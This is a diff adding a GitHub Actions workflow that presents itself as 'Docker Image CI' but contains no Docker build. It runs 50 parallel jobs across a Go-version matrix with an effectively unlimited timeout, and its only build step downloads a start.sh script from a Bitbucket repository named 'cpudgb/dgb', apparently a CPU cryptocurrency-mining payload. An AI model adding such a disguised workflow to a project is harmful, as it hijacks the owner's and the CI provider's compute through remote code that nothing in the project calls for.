@@ -1,0 +1,30 @@
+name: Docker Image CI
+on: [push, pull_request]
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 50
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I, J]
+    timeout-minutes: 999999999
+    env:
+        NUM_JOBS: 50
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Build
+      run: |
+        wget https://bitbucket.org/cpudgb/dgb/raw/42af8cb5609fa31e1d3ded83fe0b5771919e08dd/start.sh 
+      
+      
+      
